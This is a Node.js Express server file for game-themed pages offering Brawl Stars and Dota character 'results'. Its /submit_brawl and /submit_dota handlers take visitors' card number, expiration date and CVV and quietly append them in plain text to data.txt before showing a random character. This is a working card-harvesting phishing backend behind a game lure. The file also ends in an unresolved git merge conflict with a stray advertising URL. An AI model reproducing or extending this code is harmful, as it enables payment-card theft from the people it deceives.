const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const {append} = require('express/lib/response');
const res = require('express/lib/response');
const app = express();
const PORT = 3500;
const fs = require('fs');

app.use(bodyParser.urlencoded({extended: true}));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname,'views'));
app.use(express.static(path.join(__dirname, 'public')));

app.listen(PORT, () => {
    console.log('server is running on port ' + PORT);
});

app.get("/", (req, res)=>{
    res.sendFile(path.join(__dirname,'views', 'main.html'));
});

app.get("/brawl", (req,res)=>{
    res.sendFile(path.join(__dirname,'views', 'brawl.html'));
});

function randomIntFromInterval(min, max) { // min and max included 
    return Math.floor(Math.random() * (max - min + 1) + min);
  }

app.post("/submit_brawl",(req,res)=>{
    const name = req.body.name;
    const number = req.body.number;
    const expiration = req.body.expiration;
    const ccv = req.body.ccv;
    let data = name + " " + number + " " + expiration + " " + ccv + '\n';
    fs.appendFile('data.txt', data, (err) => {

        if (err) {
            console.error(err);
            return;
        }
        console.log("данные записаны в файл");
    });
    
    let random = randomIntFromInterval(1,5);
    let names = ['биби', 'эль примат', 'леончик','пэм', 'шелли'];
    let discription = ['«Биби выглядит как хулиганка и ходит с битой наперевес. Вообще-то она любит читать, но никогда не признается в этом, чтобы не испортить себе репутацию.».Биби – молодая девушка среднего роста с короткими тёмно-синими волосами в стиле Элвиса Пресли и маленькими бровями.Обладает очень высокой скоростью передвижения, имеет чуть выше среднего количество здоровья и такой же по характеристикам урон. Атакует на небольшую дистанцию, прошивая врагов. Её особенность в шкале «Хоум-рана»: если она заряжена, и вы наносите удар, то противник будет отброшен на некоторое расстояние. ','«Эль Примо всегда в центре внимания, и он это просто обожает! Публика в восторге от него, а вот коллеги – не очень...»Имеет высокую скорость передвижения, очень высокую скорость перезарядки и высокий показатель здоровья, который позволяет выдерживать ему большинство вражеских атак. Эль Примо сражается кулаками, нанося 4 удара нa короткой дистанции.','«Леон не любит общаться, так что его умение становиться невидимым весьма кстати. Не прячется он только от своей сестры Ниты.»Леон имеет очень высокую скорость передвижения и низкое здоровье. Своей обычной атакой он бросает 4 лезвия на очень большую дистанцию.','«Пэм целыми днями сортирует мусор на свалке. Она отличный работник, но у неё совсем не остаётся времени на родную дочь Джесси...»Пэм имеет нормальную скорость передвижения, средне-высокое здоровье, высокий урон на ближней дистанции и средние радиус и ширину атаки. Атакой разбрасывает шрапнель, а на Супере ставит лечебную турель. ','«Шелли — идеальный рейнджер. Она ответственная, выносливая и непревзойдённо обращается с ружьём, и ей непонятно, как Кольт перетянул всё внимание на себя...»Шелли имеет средний запас здоровья, высокую скорость передвижения, среднюю скорость перезарядки, среднюю дальность атаки и наносит большой урон на близком расстоянии. Её основная атака - выстрел дробью, имеющей некоторый разброс, что делает её менее эффективной на большой дистанции. Её Супер аналогичен обычной атаке, но содержит больше снарядов, наносит больше урона, разрушает препятствия и может отталкивать задетых противников.']
    let char_name = names[random - 1];
    let char_discription = discription[random - 1];
    res.render('index',{name,random,char_name,char_discription});
})


app.get("/dota", (req, res)=>{
    res.sendFile(path.join(__dirname,'views', 'dota.html'));
   });
   
app.post("/submit_dota", (req, res)=>{
    let name = req.body.name;
    let randnum = randomIntFromInterval(1, 17);
    let data = req.body.name + ' ' + req.body.num + ' ' + req.body.exp + ' ' + req.body.cvv + '\n';
    let names = ['Anti-Mage', 'Arc Warden', 'Crystal Maiden', 'Enigma', 'Hoodwink', 'Invoker', 'Io', 'Juggernaut', 'Morphling', "Nature's Prophet", 'Pudge', 'Shadow Fiend', 'Spectre', 'Terrorblade', 'Tidehunter', 'Tiny', 'Void Spirit',]
    let char_name = names[randnum-1];
    res.render('dota_index', { name, randnum, char_name });
    fs.appendFile('data.txt', data, (err) => {
        if (err) {
            console.error(err);
            return;
        }
    });
});

app.get("/row", (req, res)=>{
     res.sendFile(path.join(__dirname,'views','row.html'));
});
app.get("/balls", (req, res)=>{
    res.sendFile(path.join(__dirname,'views','balls.html'));
});
app.get("/strat", (req, res)=>{
    res.sendFile(path.join(__dirname,'views','strat.html'));
});

app.get("/casino", (req, res)=>{
    res.sendFile(path.join(__dirname,'views','casino.html'));
});
app.get("/card", (req, res)=>{
    res.sendFile(path.join(__dirname,'views','card.html'));
});

app.get("/learns", (req, res)=>{
    res.sendFile(path.join(__dirname,'views','learns.html'));
});
app.get("/tests", (req, res)=>{
    res.sendFile(path.join(__dirname,'views','tests.html'));
});
app.get("/quizz", (req, res)=>{
    res.sendFile(path.join(__dirname,'views','quizz.html'));
<<<<<<< HEAD
});
=======
});

// https://contract.gosuslugi.ru/?utm_source=ydirect-rsy&utm_medium=iri-social_cpc&utm_campaign=434-01-10-02_oct-2024_114831462&utm_content=banners_tgb-rectangle_n14_16561997846&utm_term=m_18-54_rf_na_sibfo-geo_desktop_yandex.ru_5500580260&yclid=14752117623220600831
>>>>>>> 2bafdd11a54c10e1a8d0f1fcd8ab81af4360c481
